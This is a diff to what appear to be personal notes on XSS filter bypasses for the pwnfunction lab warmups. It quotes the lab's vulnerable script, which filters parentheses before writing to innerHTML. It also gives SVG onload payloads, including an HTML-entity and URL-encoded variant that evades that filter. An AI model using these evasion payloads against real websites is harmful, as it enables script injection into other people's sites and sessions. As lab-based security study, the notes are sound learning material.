@@ -91,3 +91,30 @@ Character are limited to 12 only and allowed # as input.
 Payload can be created using # which is allowed atq code.
 Payload: "><svg/a=#"onload='/*#*/alert(1)' 
 In this case closing onload with '' seems good option to get xss trigerred. 
+
+
+XSS bypassing techniques from lab;
+Lab link :https://xss.pwnfunction.com/warmups/thats-hawt/
+
+ <script>
+        smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
+        smith = smith.replace(/[\(\`\)\\]/g, '')
+        will.innerHTML = smith
+    </script>
+
+    Here we can see all those restriction and we have to bypass it: 
+    This payload in the url:
+     https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=<script>alert(1)<script>
+
+Is converted to : alert1 where () is rejected as of regex restriction/filtered provided by backend logic to prevent from xss attack.
+Soliution is to html encode to alert(1) then url encode it : as given below:
+<!-- URL Encoding + HTML Entity Encoding -->
+%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E
+
+<!-- HTML Entity Encoding -->
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
+
+<!-- No Encoding -->
+<svg onload="alert(1337)">
+
+
